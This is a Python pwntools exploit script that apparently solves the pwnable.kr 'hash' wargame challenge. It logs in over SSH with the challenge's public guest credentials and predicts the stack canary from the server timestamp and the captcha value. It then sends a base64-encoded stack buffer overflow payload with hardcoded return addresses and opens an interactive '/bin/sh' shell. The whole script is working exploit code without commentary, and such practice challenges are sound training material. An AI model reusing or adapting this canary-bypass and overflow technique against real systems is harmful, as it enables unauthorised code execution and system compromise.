#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import base64

context.log_level = 'debug'

conn = ssh('fix', 'pwnable.kr', port=2222, password='guest')
get_time = conn.process('date +%s', shell=True)
p = conn.connect_remote('127.0.0.1', 9002)
# p = p.process('./hash')

# get_time = process('date +%s', shell=True)
timestamp = get_time.recvline().strip('\n')
get_time.close()

# Calculate total without canary

p.recvline()
total = int(p.recvline().split(':')[1].strip(' '))
log.debug('The captcha is %d' % total)
# if total < 0:
#	total += 4294967296
canary = int(process(['./calc_canary_jacko', str(timestamp), str(total)]).recvall(timeout=1).strip())
# total -= num
# canary = total if total > 0 else total + 4294967296
if canary < 0:
	canary += 4294967296
log.info('Calculate canary: %d(%s)' % (canary, hex(canary)))
# p.interactive()
# This need base64 encode
payload = base64.b64encode('A'* 512 + p32(canary) + 'B'*12 + p32(0x08048F92) + p32(0x08049187) + p32(0x0804B0E0))

#p.interactive()

p.sendline(str(total))
p.sendline(payload)
p.recvuntil("MD5")
p.recvline(timeout=1)
p.sendline("/bin/sh")

p.interactive()